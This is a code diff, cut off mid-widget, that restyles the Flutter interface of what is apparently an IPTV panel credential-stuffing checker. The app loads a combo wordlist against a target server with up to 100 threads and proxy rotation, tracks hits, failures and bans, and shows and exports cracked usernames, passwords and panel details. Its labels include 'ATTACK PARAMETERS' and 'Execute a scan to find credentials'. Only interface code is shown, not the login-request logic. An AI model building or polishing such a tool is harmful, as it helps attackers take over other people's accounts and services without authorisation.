+            style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.8),
+              fontFamily: 'monospace', letterSpacing: 2),
+          ),
         ),
       ]),
     ]),
   );
 
   Widget _nav() {
-    const tabs = [('⚡', 'SCAN'), ('⚙️', 'CONFIG'), ('🎯', 'HITS'), ('🔗', 'PROXY')];
+    const tabs = [('⚡','SCAN'),('⚙','CONFIG'),('🎯','HITS'),('🔗','PROXY')];
     return Container(
       decoration: BoxDecoration(
         color: cBg2.withOpacity(0.9),
-        border: Border(bottom: BorderSide(color: cBr)),
+        border: Border(bottom: BorderSide(color: cG.withOpacity(0.2))),
       ),
       child: Row(children: List.generate(4, (i) {
-        final active = _tab == i;
+        final on = _tab == i;
         return Expanded(child: GestureDetector(
           onTap: () => setState(() => _tab = i),
           child: AnimatedContainer(
             duration: const Duration(milliseconds: 200),
-            padding: const EdgeInsets.symmetric(vertical: 9),
+            padding: const EdgeInsets.symmetric(vertical: 10),
             decoration: BoxDecoration(
-              color: active ? cG.withOpacity(0.05) : Colors.transparent,
-              border: Border(bottom: BorderSide(color: active ? cG : Colors.transparent, width: 2)),
+              color: on ? cG.withOpacity(0.07) : Colors.transparent,
+              border: Border(
+                bottom: BorderSide(color: on ? cG : Colors.transparent, width: 2),
+                right: BorderSide(color: cBr, width: 0.5),
+              ),
             ),
             child: Column(mainAxisSize: MainAxisSize.min, children: [
-              Text(tabs[i].$1, style: TextStyle(fontSize: 16, shadows: active ? [const Shadow(color: cG, blurRadius: 10)] : null)),
+              Text(tabs[i].$1, style: TextStyle(fontSize: 15,
+                shadows: on ? [const Shadow(color: cG, blurRadius: 12)] : null)),
               const SizedBox(height: 2),
               Text(tabs[i].$2, style: TextStyle(
-                fontSize: 9, fontWeight: FontWeight.bold, letterSpacing: 1.5,
-                color: active ? cG : cDg,
-                shadows: active ? [const Shadow(color: cG, blurRadius: 8)] : null,
+                fontSize: 9, fontWeight: FontWeight.bold, letterSpacing: 2,
+                color: on ? cG : cDg,
+                fontFamily: 'monospace',
+                shadows: on ? [const Shadow(color: cG, blurRadius: 10)] : null,
               )),
             ]),
           ),
@@ -660,86 +686,166 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
     }
   }
 
+  // ═══ SCAN TAB ═══
   Widget _scanTab() => ListView(padding: const EdgeInsets.all(10), children: [
     if (_scanning) ...[
-      _card(ac: cG, child: Column(children: [
+      // Active scan panel
+      _termBox(child: Column(children: [
+        // Header
         Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
           _rbadge(),
           Container(
             padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
             decoration: BoxDecoration(
-              color: cBg, borderRadius: BorderRadius.circular(4),
-              border: Border.all(color: cBr)),
-            child: Text(_elapsed, style: const TextStyle(fontSize: 11, color: cCy, fontFamily: 'monospace', letterSpacing: 1)),
+              color: cBg, borderRadius: BorderRadius.circular(2),
+              border: Border.all(color: cCy.withOpacity(0.4)),
+            ),
+            child: Text(_elapsed, style: const TextStyle(
+              fontSize: 12, color: cCy, fontFamily: 'monospace',
+              letterSpacing: 2, shadows: [Shadow(color: cCy, blurRadius: 8)])),
           ),
         ]),
-        const SizedBox(height: 12),
+        const SizedBox(height: 14),
         // Progress
-        Column(children: [
+        Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
           Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-            Text('${(_pct * 100).toStringAsFixed(1)}%',
-              style: const TextStyle(fontSize: 16, color: cG, fontFamily: 'monospace',
-                fontWeight: FontWeight.bold,
-                shadows: [Shadow(color: cG, blurRadius: 12)])),
+            AnimatedBuilder(animation: _glow, builder: (_, __) => Text(
+              '${(_pct*100).toStringAsFixed(2)}%',
+              style: TextStyle(fontSize: 18, color: cG, fontFamily: 'monospace',
+                fontWeight: FontWeight.bold, letterSpacing: 1,
+                shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))),
             Text('${_fmt(_checked)} / ${_fmt(_total)}',
-              style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 1)),
+              style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
           ]),
           const SizedBox(height: 8),
+          // Custom progress bar
           Stack(children: [
-            Container(height: 8, decoration: BoxDecoration(
-              color: cBr, borderRadius: BorderRadius.circular(4))),
+            Container(height: 10, decoration: BoxDecoration(
+              color: cBr, borderRadius: BorderRadius.circular(1),
+              border: Border.all(color: cG.withOpacity(0.2)),
+            )),
             AnimatedContainer(
-              duration: const Duration(milliseconds: 300),
-              height: 8,
-              width: MediaQuery.of(context).size.width * _pct * 0.88,
+              duration: const Duration(milliseconds: 200),
+              height: 10,
+              width: (MediaQuery.of(context).size.width - 44) * _pct,
               decoration: BoxDecoration(
-                borderRadius: BorderRadius.circular(4),
-                gradient: const LinearGradient(colors: [Color(0xFF004D18), cG2, cG]),
-                boxShadow: [BoxShadow(color: cG.withOpacity(0.5), blurRadius: 8)],
+                borderRadius: BorderRadius.circular(1),
+                gradient: LinearGradient(colors: [
+                  const Color(0xFF003310), cG2, cG,
+                  cG.withOpacity(0.8),
+                ]),
+                boxShadow: [
+                  BoxShadow(color: cG.withOpacity(0.6), blurRadius: 8),
+                  BoxShadow(color: cG.withOpacity(0.3), blurRadius: 16),
+                ],
               ),
             ),
+            // Animated shimmer on progress bar
+            AnimatedBuilder(animation: _scan, builder: (_, __) {
+              final barWidth = (MediaQuery.of(context).size.width - 44) * _pct;
+              return Positioned(
+                left: barWidth * _scan.value - 20,
+                child: Container(
+                  width: 40, height: 10,
+                  decoration: BoxDecoration(
+                    gradient: LinearGradient(colors: [
+                      Colors.transparent,
+                      Colors.white.withOpacity(0.4),
+                      Colors.transparent,
+                    ]),
+                  ),
+                ),
+              );
+            }),
           ]),
         ]),
-        const SizedBox(height: 12),
+        const SizedBox(height: 14),
+        // Stats
         Row(children: [
-          Expanded(child: _sbox('HITS', '$_hn', cG)),
-          const SizedBox(width: 8),
-          Expanded(child: _sbox('FAIL', _fmt(_fails), cRe)),
-          const SizedBox(width: 8),
-          Expanded(child: _sbox('BANS', '$_bans', cYe)),
+          Expanded(child: _statCard('HITS', '$_hn', cG, big: true)),
+          const SizedBox(width: 6),
+          Expanded(child: _statCard('FAIL', _fmt(_fails), cRe, big: true)),
+          const SizedBox(width: 6),
+          Expanded(child: _statCard('BANS', '$_bans', cYe, big: true)),
         ]),
         const SizedBox(height: 8),
-        _cpmBox(),
+        // CPM
+        AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
+          padding: const EdgeInsets.symmetric(vertical: 12),
+          decoration: BoxDecoration(
+            color: cYe.withOpacity(0.04),
+            borderRadius: BorderRadius.circular(2),
+            border: Border.all(color: cYe.withOpacity(0.3)),
+            boxShadow: [BoxShadow(color: cYe.withOpacity(_glow.value * 0.15), blurRadius: 20)],
+          ),
+          child: Column(children: [
+            Text(_fmt(_cpm), style: TextStyle(
+              fontSize: 36, fontWeight: FontWeight.bold, color: cYe,
+              fontFamily: 'monospace', letterSpacing: -2,
+              shadows: [Shadow(color: cYe.withOpacity(_glow.value), blurRadius: 20)])),
+            Text('CHECKS / MIN', style: TextStyle(
+              fontSize: 8, color: cYe.withOpacity(0.6), letterSpacing: 4)),
+          ]),
+        )),
         const SizedBox(height: 12),
         Row(children: [
-          Expanded(child: _btn(
-            _paused ? '▶ REANUDAR' : '⏸ PAUSAR',
+          Expanded(child: _hackerBtn(
+            _paused ? '▶ RESUME' : '⏸ PAUSE',
             c: _paused ? cG : cYe,
             onTap: () => setState(() => _paused = !_paused))),
           const SizedBox(width: 8),
-          Expanded(child: _btn('⬛ DETENER', c: cRe,
+          Expanded(child: _hackerBtn('■ ABORT', c: cRe,
             onTap: () { setState(() => _scanning = false); _timer?.cancel(); })),
         ]),
       ])),
+      // Mini log durante scan
+      _termBox(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+        _termTitle('> LIVE OUTPUT'),
+        const SizedBox(height: 6),
+        SizedBox(
+          height: 80,
+          child: ListView.builder(
+            reverse: false,
+            itemCount: min(_logs.length, 8),
+            itemBuilder: (_, i) => Text(_logs[i],
+              style: TextStyle(
+                fontSize: 9, fontFamily: 'monospace', height: 1.6,
+                color: _logs[i].contains('[HIT]') ? cG
+                  : _logs[i].contains('[-]') ? cRe
+                  : _logs[i].contains('[!]') ? cYe
+                  : _logs[i].startsWith('═') ? cG.withOpacity(0.4)
+                  : cDg,
+              )),
+          ),
+        ),
+      ])),
     ] else ...[
-      _card(ac: cCy, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        _ct('SERVIDOR ACTIVO'),
+      // Idle state
+      _termBox(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+        _termTitle('> TARGET CONFIGURATION'),
+        const SizedBox(height: 10),
+        // Server
         Row(children: [
-          Container(width: 8, height: 8, decoration: BoxDecoration(
-            shape: BoxShape.circle,
-            color: _srv != null ? cG : cRe,
-            boxShadow: [BoxShadow(color: (_srv != null ? cG : cRe).withOpacity(0.6), blurRadius: 6)],
+          AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
+            width: 8, height: 8,
+            decoration: BoxDecoration(
+              shape: BoxShape.circle,
+              color: _srv != null ? cG : cRe,
+              boxShadow: [BoxShadow(
+                color: (_srv != null ? cG : cRe).withOpacity(_pulse.value),
+                blurRadius: 8)],
+            ),
           )),
           const SizedBox(width: 8),
-          Expanded(child: Text(_srv ?? 'Sin servidor configurado',
-            style: TextStyle(fontSize: 11, color: _srv != null ? cCy : cDg),
+          Text('TARGET: ', style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
+          Expanded(child: Text(_srv ?? '[NOT SET]',
+            style: TextStyle(fontSize: 10, fontFamily: 'monospace',
+              color: _srv != null ? cCy : cRe,
+              shadows: _srv != null ? [const Shadow(color: cCy, blurRadius: 6)] : null),
             overflow: TextOverflow.ellipsis)),
         ]),
-        const SizedBox(height: 10),
-        _sbtn('⚙ CONFIGURAR', c: cCy, onTap: () => setState(() => _tab = 1)),
-      ])),
-      _card(ac: cYe, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        _ct('COMBO'),
+        const SizedBox(height: 8),
+        // Combo
         Row(children: [
           Container(width: 8, height: 8, decoration: BoxDecoration(
             shape: BoxShape.circle,
@@ -747,176 +853,208 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
             boxShadow: [BoxShadow(color: (_combo.isEmpty ? cRe : cG).withOpacity(0.6), blurRadius: 6)],
           )),
           const SizedBox(width: 8),
+          Text('WORDLIST: ', style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
           Expanded(child: Text(
-            _combo.isEmpty ? 'Sin combo cargado' : '$_cname — ${_fmt(_combo.length)} únicos',
-            style: TextStyle(fontSize: 11, color: _combo.isEmpty ? cDg : cYe),
-            overflow: TextOverflow.ellipsis,
-          )),
+            _combo.isEmpty ? '[NOT LOADED]' : '${_fmt(_combo.length)} entries',
+            style: TextStyle(fontSize: 10, fontFamily: 'monospace',
+              color: _combo.isEmpty ? cRe : cYe,
+              shadows: _combo.isEmpty ? null : [const Shadow(color: cYe, blurRadius: 6)]),
+            overflow: TextOverflow.ellipsis)),
         ]),
-        const SizedBox(height: 10),
-        _sbtn('📂 CARGAR COMBO', c: cYe, onTap: _loadCombo),
+        const SizedBox(height: 12),
+        Row(children: [
+          Expanded(child: _hackerBtn('⚙ CONFIG', c: cCy,
+            onTap: () => setState(() => _tab = 1))),
+          const SizedBox(width: 8),
+          Expanded(child: _hackerBtn('📂 WORDLIST', c: cYe, onTap: _loadCombo)),
+        ]),
       ])),
-      _card(child: Column(children: [
-        _ct('CONFIGURACIÓN'),
+      // Bot config
+      _termBox(child: Column(children: [
+        _termTitle('> ATTACK PARAMETERS'),
+        const SizedBox(height: 10),
         Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-          const Text('BOTS SIMULTÁNEOS', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2)),
-          AnimatedBuilder(animation: _glow, builder: (_, __) => Text('$_bots',
+          Text('THREADS:', style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
+          AnimatedBuilder(animation: _glow, builder: (_, __) => Text(
+            '$_bots',
             style: TextStyle(fontSize: 20, color: cG, fontFamily: 'monospace',
               fontWeight: FontWeight.bold,
-              shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 12)]))),
+              shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 10)]))),
         ]),
-        const SizedBox(height: 4),
         Slider(value: _bots.toDouble(), min: 1, max: 100,
           onChanged: (v) => setState(() => _bots = v.round())),
-        const SizedBox(height: 4),
         Row(children: [
-          Expanded(child: _ibox('PROXY', _proxies.isEmpty ? 'Directo' : '${_proxies.length} px', cMg)),
-          const SizedBox(width: 8),
-          Expanded(child: _ibox('TIMEOUT', '${_tout}s', cCy)),
-          const SizedBox(width: 8),
-          Expanded(child: _ibox('MODO', 'Nativo', cG)),
+          Expanded(child: _paramBox('PROXY', _proxies.isEmpty ? 'NONE' : '${_proxies.length}px', cMg)),
+          const SizedBox(width: 6),
+          Expanded(child: _paramBox('TIMEOUT', '${_tout}s', cCy)),
+          const SizedBox(width: 6),
+          Expanded(child: _paramBox('MODE', 'NATIVE', cG)),
         ]),
       ])),
-      _card(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        _ct('LOG DEL SISTEMA'),
+      // Terminal log
+      _termBox(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+        _termTitle('> SYSTEM LOG'),
+        const SizedBox(height: 6),
         Container(
-          height: 110,
-          decoration: BoxDecoration(
-            color: const Color(0xFF010201),
-            borderRadius: BorderRadius.circular(4),
-            border: Border.all(color: cBr),
-          ),
-          child: ListView.builder(
-            padding: const EdgeInsets.all(6),
-            itemCount: _logs.length,
-            itemBuilder: (_, i) => Padding(
-              padding: const EdgeInsets.only(bottom: 1),
-              child: Text(_logs[i], style: TextStyle(fontSize: 9, color: _lc(_logs[i]), height: 1.6,
-                fontFamily: 'monospace')),
-            ),
-          ),
+          height: 120,
+          color: Colors.black.withOpacity(0.3),
+          child: _logs.isEmpty
+            ? Padding(padding: const EdgeInsets.all(8),
+                child: Text('// Awaiting commands...',
+                  style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.5), fontFamily: 'monospace')))
+            : ListView.builder(
+                padding: const EdgeInsets.all(6),
+                itemCount: _logs.length,
+                itemBuilder: (_, i) => Text(_logs[i],
+                  style: TextStyle(
+                    fontSize: 9, fontFamily: 'monospace', height: 1.6,
+                    color: _logs[i].contains('[HIT]') ? cG
+                      : _logs[i].contains('[-]') ? cRe
+                      : _logs[i].contains('[!]') ? cYe
+                      : _logs[i].contains('[+]') ? cCy
+                      : _logs[i].startsWith('═') ? cG.withOpacity(0.3)
+                      : cDg,
+                  )),
+              ),
         ),
       ])),
+      // Launch button
       const SizedBox(height: 4),
-      _bigBtn('⚡ INICIAR ESCANEO', onTap: _startScan),
+      AnimatedBuilder(animation: _glow, builder: (_, __) => GestureDetector(
+        onTap: _startScan,
+        child: Container(
+          width: double.infinity,
+          padding: const EdgeInsets.symmetric(vertical: 18),
+          decoration: BoxDecoration(
+            borderRadius: BorderRadius.circular(2),
+            border: Border.all(color: cG.withOpacity(0.7), width: 1.5),
+            gradient: LinearGradient(colors: [
+              cG.withOpacity(0.04), cG.withOpacity(0.1), cG.withOpacity(0.04)]),
+            boxShadow: [
+              BoxShadow(color: cG.withOpacity(_glow.value * 0.35), blurRadius: 25),
+              BoxShadow(color: cG.withOpacity(0.15), blurRadius: 50),
+            ],
+          ),
+          child: Text('[ EXECUTE SCAN ]', textAlign: TextAlign.center,
+            style: TextStyle(
+              fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 4,
+              fontFamily: 'monospace', color: cG,
+              shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)])),
+        ),
+      )),
     ],
   ]);
 
+  // ═══ CONFIG TAB ═══
   Widget _cfgTab() => ListView(padding: const EdgeInsets.all(10), children: [
-    _sec('SERVIDOR IPTV'),
-    _card(ac: cCy, child: Column(children: [
-      _ct('AGREGAR SERVIDOR'),
+    _termBox(child: Column(children: [
+      _termTitle('> TARGET SERVER'),
+      const SizedBox(height: 10),
       TextField(
         controller: _srvCtrl,
         style: const TextStyle(color: cG, fontSize: 12, fontFamily: 'monospace'),
         decoration: InputDecoration(
-          hintText: 'http://panel.com:8080',
-          hintStyle: TextStyle(color: cDg.withOpacity(0.6), fontSize: 12),
+          hintText: 'http://target.server:8080',
+          hintStyle: TextStyle(color: cDg.withOpacity(0.5), fontSize: 11, fontFamily: 'monospace'),
           filled: true, fillColor: Colors.black54,
-          prefixIcon: const Icon(Icons.dns, color: cDg, size: 18),
-          border: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cBr)),
-          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cBr)),
-          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cG, width: 1.5)),
-          contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
+          prefixText: '>> ',
+          prefixStyle: const TextStyle(color: cG, fontFamily: 'monospace'),
+          border: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: const BorderSide(color: cBr)),
+          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: BorderSide(color: cG.withOpacity(0.3))),
+          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: const BorderSide(color: cG, width: 1.5)),
+          contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
         ),
       ),
-      const SizedBox(height: 10),
-      _btn('🔍 VERIFICAR Y AGREGAR', c: cCy, onTap: _addSrv),
+      const SizedBox(height: 8),
+      _hackerBtn('[ CONNECT & VERIFY ]', c: cCy, onTap: _addSrv),
       if (_srvs.isNotEmpty) ...[
-        _sec('SERVIDORES ACTIVOS'),
-        ..._srvs.asMap().entries.map((e) => AnimatedContainer(
-          duration: const Duration(milliseconds: 300),
-          margin: const EdgeInsets.only(bottom: 6),
+        const SizedBox(height: 10),
+        _termTitle('> ACTIVE TARGETS'),
+        const SizedBox(height: 6),
+        ..._srvs.asMap().entries.map((e) => Container(
+          margin: const EdgeInsets.only(bottom: 5),
           padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
           decoration: BoxDecoration(
-            color: cBg,
-            borderRadius: BorderRadius.circular(4),
-            border: Border.all(color: e.value == _srv ? cCy.withOpacity(0.4) : cBr),
-            boxShadow: e.value == _srv ? [BoxShadow(color: cCy.withOpacity(0.1), blurRadius: 8)] : null,
+            color: e.value == _srv ? cG.withOpacity(0.05) : Colors.transparent,
+            borderRadius: BorderRadius.circular(2),
+            border: Border.all(color: e.value == _srv ? cG.withOpacity(0.4) : cBr),
           ),
           child: Row(children: [
-            Container(width: 6, height: 6, decoration: const BoxDecoration(
-              shape: BoxShape.circle, color: cG,
-              boxShadow: [BoxShadow(color: cG, blurRadius: 4)],
-            )),
-            const SizedBox(width: 8),
-            Expanded(child: Text(e.value, style: const TextStyle(fontSize: 10, color: cCy),
+            Text('[${e.key+1}] ', style: const TextStyle(color: cDg, fontSize: 10, fontFamily: 'monospace')),
+            Expanded(child: Text(e.value,
+              style: TextStyle(fontSize: 10, color: e.value == _srv ? cG : cCy,
+                fontFamily: 'monospace'),
               overflow: TextOverflow.ellipsis)),
             GestureDetector(
-              onTap: () => setState(() {
-                _srvs.removeAt(e.key);
-                _srv = _srvs.isNotEmpty ? _srvs[0] : null;
-              }),
-              child: Container(
-                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
-                decoration: BoxDecoration(
-                  color: cRe.withOpacity(0.1), borderRadius: BorderRadius.circular(3),
-                  border: Border.all(color: cRe.withOpacity(0.3))),
-                child: const Text('✕', style: TextStyle(color: cRe, fontSize: 11)),
-              ),
+              onTap: () => setState(() { _srvs.removeAt(e.key); _srv = _srvs.isNotEmpty ? _srvs[0] : null; }),
+              child: Text('[X]', style: const TextStyle(color: cRe, fontSize: 10, fontFamily: 'monospace')),
             ),
           ]),
         )),
       ],
     ])),
-    _sec('TIMEOUT'),
-    _card(child: Column(children: [
+    _termBox(child: Column(children: [
+      _termTitle('> TIMEOUT CONFIG'),
+      const SizedBox(height: 8),
       Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-        const Text('SEGUNDOS POR PETICIÓN', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2)),
-        Text('${_tout}s', style: const TextStyle(fontSize: 20, color: cG, fontFamily: 'monospace',
-          fontWeight: FontWeight.bold, shadows: [Shadow(color: cG, blurRadius: 8)])),
+        Text('TIMEOUT:', style: const TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace')),
+        Text('${_tout}s', style: const TextStyle(fontSize: 20, color: cG,
+          fontFamily: 'monospace', fontWeight: FontWeight.bold,
+          shadows: [Shadow(color: cG, blurRadius: 8)])),
       ]),
       Slider(value: _tout.toDouble(), min: 5, max: 30,
         onChanged: (v) => setState(() => _tout = v.round())),
-      Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-        _qtBtn('5s', 5), _qtBtn('8s', 8), _qtBtn('10s', 10), _qtBtn('15s', 15), _qtBtn('20s', 20),
-      ]),
+      Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [5,8,10,15,20].map((v) =>
+        GestureDetector(
+          onTap: () => setState(() => _tout = v),
+          child: Container(
+            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
+            decoration: BoxDecoration(
+              color: _tout == v ? cG.withOpacity(0.15) : Colors.transparent,
+              borderRadius: BorderRadius.circular(2),
+              border: Border.all(color: _tout == v ? cG : cBr),
+            ),
+            child: Text('${v}s', style: TextStyle(
+              fontSize: 10, color: _tout == v ? cG : cDg,
+              fontFamily: 'monospace', fontWeight: FontWeight.bold)),
+          ),
+        )).toList(),
+      ),
     ])),
   ]);
 
-  Widget _qtBtn(String label, int val) => GestureDetector(
-    onTap: () => setState(() => _tout = val),
-    child: Container(
-      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
-      decoration: BoxDecoration(
-        color: _tout == val ? cG.withOpacity(0.15) : Colors.transparent,
-        borderRadius: BorderRadius.circular(3),
-        border: Border.all(color: _tout == val ? cG.withOpacity(0.5) : cBr),
-      ),
-      child: Text(label, style: TextStyle(
-        fontSize: 10, color: _tout == val ? cG : cDg, fontWeight: FontWeight.bold)),
-    ),
-  );
-
+  // ═══ HITS TAB ═══
   Widget _hitsTab() => Column(children: [
     Container(
       padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
-      color: cBg2.withOpacity(0.9),
+      decoration: BoxDecoration(
+        color: cBg2.withOpacity(0.95),
+        border: Border(bottom: BorderSide(color: cG.withOpacity(0.2))),
+      ),
       child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
         Row(children: [
-          AnimatedBuilder(animation: _glow, builder: (_, __) => Text('${_hits.length}',
+          Text('// HITS: ', style: TextStyle(fontSize: 12, color: cDg, fontFamily: 'monospace')),
+          AnimatedBuilder(animation: _glow, builder: (_, __) => Text('$_hn',
             style: TextStyle(fontSize: 22, color: cG, fontFamily: 'monospace',
               fontWeight: FontWeight.bold,
               shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))),
-          const SizedBox(width: 6),
-          const Text('HITS', style: TextStyle(fontSize: 11, color: cDg, letterSpacing: 3, fontWeight: FontWeight.bold)),
         ]),
         Row(children: [
-          _sbtn('💾 EXPORTAR', c: cCy, onTap: _export),
-          const SizedBox(width: 8),
-          _sbtn('🗑 LIMPIAR', c: cRe, onTap: () => setState(() => _hits.clear())),
+          _miniBtn('EXPORT', c: cCy, onTap: _export),
+          const SizedBox(width: 6),
+          _miniBtn('CLEAR', c: cRe, onTap: () => setState(() { _hits.clear(); _hn = 0; })),
         ]),
       ]),
     ),
     Expanded(child: _hits.isEmpty
       ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
-          AnimatedBuilder(animation: _pulse, builder: (_, __) => Text('🎯',
-            style: TextStyle(fontSize: 48,
-              shadows: [Shadow(color: cG.withOpacity(_pulse.value * 0.5), blurRadius: 20)]))),
-          const SizedBox(height: 12),
-          const Text('LOS HITS APARECERÁN AQUÍ', style: TextStyle(fontSize: 11, color: cDg, letterSpacing: 2)),
-          const SizedBox(height: 4),
-          Text('Inicia un escaneo para comenzar', style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.6))),
+          AnimatedBuilder(animation: _pulse, builder: (_, __) => Text(
+            '// NO HITS YET //', 
+            style: TextStyle(fontSize: 14, color: cG.withOpacity(_pulse.value * 0.5),
+              fontFamily: 'monospace', letterSpacing: 3))),
+          const SizedBox(height: 8),
+          Text('Execute a scan to find credentials',
+            style: TextStyle(fontSize: 10, color: cDg.withOpacity(0.5), fontFamily: 'monospace')),
         ]))
       : ListView.builder(
           padding: const EdgeInsets.all(10),
@@ -925,226 +1063,151 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
   ]);
 
   Widget _hitCard(HitItem h) => Container(
-    margin: const EdgeInsets.only(bottom: 12),
+    margin: const EdgeInsets.only(bottom: 10),
     decoration: BoxDecoration(
-      gradient: const LinearGradient(
-        begin: Alignment.topLeft, end: Alignment.bottomRight,
-        colors: [Color(0xFF001A00), Color(0xFF000D00)]),
-      borderRadius: BorderRadius.circular(8),
+      color: cBg2.withOpacity(0.9),
+      borderRadius: BorderRadius.circular(2),
       border: Border(
         left: const BorderSide(color: cG, width: 3),
         top: BorderSide(color: cG.withOpacity(0.3)),
         right: BorderSide(color: cG.withOpacity(0.1)),
         bottom: BorderSide(color: cG.withOpacity(0.1)),
       ),
-      boxShadow: [BoxShadow(color: cG.withOpacity(0.08), blurRadius: 15, offset: const Offset(0, 4))],
+      boxShadow: [
+        BoxShadow(color: cG.withOpacity(0.1), blurRadius: 15),
+      ],
     ),
     child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-      Padding(padding: const EdgeInsets.fromLTRB(14, 12, 14, 10), child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start, children: [
-        Row(children: [
-          Container(width: 8, height: 8, decoration: const BoxDecoration(
-            shape: BoxShape.circle, color: cG,
-            boxShadow: [BoxShadow(color: cG, blurRadius: 6)],
-          )),
-          const SizedBox(width: 8),
-          Expanded(child: Text(h.username, style: const TextStyle(color: cG, fontSize: 14,
-            fontWeight: FontWeight.bold, letterSpacing: 0.5))),
+      // Terminal header
+      Container(
+        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
+        decoration: BoxDecoration(
+          color: cG.withOpacity(0.06),
+          border: Border(bottom: BorderSide(color: cG.withOpacity(0.15))),
+        ),
+        child: Row(children: [
+          Container(width: 6, height: 6, decoration: const BoxDecoration(
+            shape: BoxShape.circle, color: cRe)),
+          const SizedBox(width: 4),
+          Container(width: 6, height: 6, decoration: const BoxDecoration(
+            shape: BoxShape.circle, color: cYe)),
+          const SizedBox(width: 4),
+          Container(width: 6, height: 6, decoration: const BoxDecoration(
+            shape: BoxShape.circle, color: cG)),
+          const SizedBox(width: 10),
+          Text('// HIT FOUND — ${h.foundAt.toString().substring(11, 19)}',
+            style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
         ]),
-        const SizedBox(height: 4),
-        Padding(padding: const EdgeInsets.only(left: 16), child: Column(
-          crossAxisAlignment: CrossAxisAlignment.start, children: [
-          Row(children: [
-            Text('🔑 ', style: TextStyle(fontSize: 11)),
-            Text(h.password, style: const TextStyle(color: cDg, fontSize: 11)),
-          ]),
-          const SizedBox(height: 2),
-          Row(children: [
-            Text('🖥 ', style: TextStyle(fontSize: 10)),
-            Expanded(child: Text(h.panel, style: const TextStyle(color: cCy, fontSize: 9),
-              overflow: TextOverflow.ellipsis)),
-          ]),
-        ])),
-        const SizedBox(height: 8),
-        Wrap(spacing: 5, runSpacing: 5, children: [
-          _bdg('📅 ${h.expira}', cYe),
-          _bdg('🔗 ${h.activ}/${h.conex}', cCy),
-          _bdg('✓ ${h.status}', cG),
-          if (h.timezone.isNotEmpty) _bdg('🌍 ${h.timezone}', cMg),
+      ),
+      // Credentials
+      Padding(padding: const EdgeInsets.fromLTRB(12, 10, 12, 6), child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start, children: [
+        _credRow('USER', h.username, cG),
+        _credRow('PASS', h.password, cCy),
+        _credRow('HOST', h.panel, cMg),
+        const SizedBox(height: 6),
+        Wrap(spacing: 5, runSpacing: 4, children: [
+          _termBadge('EXP:${h.expira}', cYe),
+          _termBadge('CON:${h.activ}/${h.conex}', cCy),
+          _termBadge('ST:${h.status.toUpperCase()}', cG),
+          if (h.timezone.isNotEmpty) _termBadge('TZ:${h.timezone}', cMg),
         ]),
       ])),
+      // Panel info
       Container(
-        margin: const EdgeInsets.symmetric(horizontal: 14),
-        height: 1,
-        color: cG.withOpacity(0.08),
-      ),
-      Padding(padding: const EdgeInsets.fromLTRB(14, 10, 14, 10), child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start, children: [
-        Row(children: [
-          Container(width: 4, height: 4, decoration: const BoxDecoration(shape: BoxShape.circle, color: cCy)),
-          const SizedBox(width: 6),
-          const Text('VERIFICACIÓN DE PANEL', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2, fontWeight: FontWeight.bold)),
-        ]),
-        const SizedBox(height: 8),
-        h.panelInfo == null
+        margin: const EdgeInsets.symmetric(horizontal: 12),
+        padding: const EdgeInsets.all(8),
